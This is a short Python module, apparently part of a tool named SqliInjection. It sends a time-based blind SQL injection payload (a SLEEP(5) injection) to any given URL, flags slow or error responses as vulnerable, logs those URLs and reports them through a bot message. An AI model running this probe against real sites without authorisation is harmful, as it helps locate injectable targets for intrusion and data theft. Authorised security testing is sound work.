import requests
import time
from SqliInjection.includes import write
from . import bot


def sqlscan(url,output):
    try:
        payload = "' AND SLEEP(5) AND '1'='1"
        start_time = time.time()
        response = requests.get(url + payload)
        end_time = time.time()
        if end_time - start_time >= 5 or "500 error" in response.text or "SQL syntax" in response.text :
            print("checking ====> " f"{url}")
            outputprint= (f"\n[Vulnerable] ====> " f"{url}\n")
            print(outputprint)
            print("The website may be vulnerable to SQL injection.")
            if output is not None:
                write.write(output, f"{url}\n")
                if True:
                    bot.sendmessage("vulnerable: "+url)
        else:
            print("No SQL injection vulnerability found in ===>" f"{url}")

    except requests.exceptions.RequestException as e:
        print("invalid url" f"{url}",e)
        
        
        

